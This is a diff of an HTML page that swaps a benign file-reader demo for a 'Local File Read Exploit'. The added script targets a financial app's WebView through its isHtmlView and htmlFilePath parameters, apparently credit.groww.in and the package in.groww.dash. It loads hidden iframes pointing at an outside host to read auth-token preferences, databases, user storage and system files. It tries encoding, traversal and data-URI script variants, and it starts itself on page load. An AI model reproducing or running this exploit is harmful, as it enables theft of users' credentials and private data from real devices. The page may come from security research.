@@ -1,84 +1,209 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Reader POC</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Local File Read Exploit</title>
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-        }
+        body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
+        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
+        button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
+        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; }
     </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
-
-    <div class="bg-white rounded-xl shadow-lg p-8 w-full max-w-2xl">
-        <div class="flex items-center justify-between mb-6">
-            <h1 class="text-3xl font-bold text-gray-800">File Reader PoC</h1>
-            <svg class="h-8 w-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.85-1.215 2.915-2.753l.363-2.906c.06-.481-.137-.965-.516-1.28l-5.6-4.782a1.5 1.5 0 00-1.928 0l-5.6 4.782c-.379.315-.576.799-.516 1.28l.363 2.906c.065 1.538 1.375 2.753 2.915 2.753z" />
-            </svg>
-        </div>
-
-        <p class="text-gray-600 mb-6">
-            This page attempts to read a file from the device's internal storage and display its content. This is for demonstration purposes only.
-        </p>
-
-        <label for="filePath" class="block text-sm font-medium text-gray-700">Path to file on storage:</label>
-        <input type="text" id="filePath" value="/sdcard/test.txt" class="mt-1 block w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-
-        <button id="readFileBtn" class="mt-4 w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-md shadow-sm transition-colors">
-            Read File
-        </button>
-
-        <div class="mt-6">
-            <h2 class="text-xl font-semibold text-gray-800 mb-2">File Content:</h2>
-            <div id="fileContent" class="bg-gray-50 border border-gray-300 rounded-md p-4 min-h-[200px] overflow-auto text-gray-700 text-sm whitespace-pre-wrap">
-                Click the "Read File" button to attempt to read the file.
-            </div>
-        </div>
-    </div>
+<body>
+    <h1>🔓 Local File Read Exploit</h1>
+    <p>Testing local file access via isHtmlView=true&htmlFilePath=</p>
+    
+    <button onclick="readAppFiles()">📱 Read App Files</button>
+    <button onclick="readSystemFiles()">⚙️ Read System Files</button>
+    <button onclick="readUserFiles()">👤 Read User Files</button>
+    <button onclick="readDatabaseFiles()">💾 Read Database Files</button>
+    
+    <div id="results"></div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const fileContentDiv = document.getElementById('fileContent');
-            const filePathInput = document.getElementById('filePath');
-            const readFileBtn = document.getElementById('readFileBtn');
+        function addResult(title, content) {
+            const div = document.createElement('div');
+            div.className = 'result';
+            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
+            document.getElementById('results').appendChild(div);
+        }
 
-            // Function to display messages in the UI
-            function logMessage(message) {
-                fileContentDiv.textContent = message;
-            }
-
-            readFileBtn.addEventListener('click', async () => {
-                const filePath = filePathInput.value;
-                logMessage('Attempting to read file from: ' + filePath + '...');
-
-                try {
-                    // Use the file:/// URI scheme to access the local file system.
-                    // This will only work if the WebView is configured to allow file access.
-                    const fileUrl = 'file://' + filePath;
+        function readAppFiles() {
+            console.log("Attempting to read app files...");
+            
+            const appFiles = [
+                "/android_asset/config.json",
+                "/android_asset/cd-offer-details.json", 
+                "/android_asset/dashboard_response_mocked.json",
+                "/data/data/in.groww.dash/shared_prefs/",
+                "/data/data/in.groww.dash/files/",
+                "/data/data/in.groww.dash/cache/"
+            ];
+            
+            appFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
                     
-                    const response = await fetch(fileUrl);
-
-                    if (response.ok) {
-                        // If the response is successful, get the text content.
-                        const fileContent = await response.text();
-                        logMessage(fileContent);
-                        console.log('File read successfully.');
-                    } else {
-                        // Handle server errors or file not found.
-                        const errorText = await response.text();
-                        logMessage(`Failed to read file. Status: ${response.status} (${response.statusText})\nError: ${errorText}`);
-                        console.error('Failed to read file:', response.status, response.statusText);
-                    }
-                } catch (error) {
-                    // Handle network errors or other exceptions.
-                    logMessage(`An error occurred: ${error.message}`);
-                    console.error('An error occurred during file read:', error);
-                }
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = readUrl;
+                    document.body.appendChild(iframe);
+                    
+                    console.log(`Attempting to read: ${file}`);
+                    
+                    setTimeout(() => {
+                        try { document.body.removeChild(iframe); } catch(e) {}
+                    }, 5000);
+                }, index * 1000);
             });
+            
+            addResult("📱 App Files", "Attempting to read application files and configs");
+        }
+
+        function readSystemFiles() {
+            console.log("Attempting to read system files...");
+            
+            const systemFiles = [
+                "/proc/version",
+                "/system/build.prop",
+                "/proc/cpuinfo",
+                "/proc/meminfo",
+                "/etc/hosts",
+                "/proc/net/arp"
+            ];
+            
+            systemFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    // Try direct file:// access through htmlFilePath
+                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`;
+                    
+                    window.open(readUrl, `_blank_${index}`);
+                    console.log(`Attempting to read: ${file}`);
+                }, index * 1500);
+            });
+            
+            addResult("⚙️ System Files", "Attempting to read system configuration files");
+        }
+
+        function readUserFiles() {
+            console.log("Attempting to read user files...");
+            
+            const userFiles = [
+                "/storage/emulated/0/Download/",
+                "/storage/emulated/0/Documents/",
+                "/storage/emulated/0/Pictures/",
+                "/storage/emulated/0/Android/data/in.groww.dash/",
+                "/sdcard/Android/data/in.groww.dash/files/"
+            ];
+            
+            userFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
+                    
+                    // Try both iframe and direct navigation
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = readUrl;
+                    document.body.appendChild(iframe);
+                    
+                    console.log(`Attempting to read: ${file}`);
+                }, index * 800);
+            });
+            
+            addResult("👤 User Files", "Attempting to read user storage and app data");
+        }
+
+        function readDatabaseFiles() {
+            console.log("Attempting to read database files...");
+            
+            const dbFiles = [
+                "/data/data/in.groww.dash/databases/",
+                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
+                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml",
+                "/data/data/in.groww.dash/files/user_data.json"
+            ];
+            
+            dbFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    // Multiple attack vectors for database access
+                    const methods = [
+                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`,
+                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`,
+                        `https://credit.groww.in/pl/permission-screen?webViewUrl=data:text/html,<script>fetch('file://${file}').then(r=>r.text()).then(console.log)</script>`
+                    ];
+                    
+                    methods.forEach((method, methodIndex) => {
+                        setTimeout(() => {
+                            const iframe = document.createElement('iframe');
+                            iframe.style.display = 'none';
+                            iframe.src = method;
+                            document.body.appendChild(iframe);
+                            
+                            console.log(`DB access method ${methodIndex + 1}: ${file}`);
+                        }, methodIndex * 500);
+                    });
+                }, index * 2000);
+            });
+            
+            addResult("💾 Database Files", "Attempting to read app databases and preferences");
+        }
+
+        // Enhanced file read with different techniques
+        function enhancedFileRead() {
+            const sensitiveFiles = [
+                // SharedPreferences (contains auth tokens!)
+                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
+                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml", 
+                
+                // App config files
+                "/android_asset/cd-offer-details.json",
+                "/android_asset/dashboard_response_mocked.json",
+                
+                // Potential log files
+                "/data/data/in.groww.dash/files/logs/",
+                "/storage/emulated/0/Android/data/in.groww.dash/files/"
+            ];
+            
+            sensitiveFiles.forEach(file => {
+                // Try multiple encoding techniques
+                const encodedFile = encodeURIComponent(file);
+                const doubleEncodedFile = encodeURIComponent(encodedFile);
+                
+                const attackUrls = [
+                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodedFile}`,
+                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${doubleEncodedFile}`,
+                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=../${encodedFile}`,
+                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`
+                ];
+                
+                attackUrls.forEach(url => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                });
+            });
+        }
+
+        // Auto-start with most promising targets
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                console.log("Auto-starting file read tests...");
+                
+                // Test most likely to work: app assets
+                const testFile = "/android_asset/cd-offer-details.json";
+                const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(testFile)}`;
+                
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = readUrl;
+                document.body.appendChild(iframe);
+                
+                addResult("🚀 Auto Test", `Attempting to read: ${testFile}`);
+                
+                // Try enhanced techniques
+                setTimeout(() => enhancedFileRead(), 3000);
+            }, 2000);
         });
     </script>
 </body>
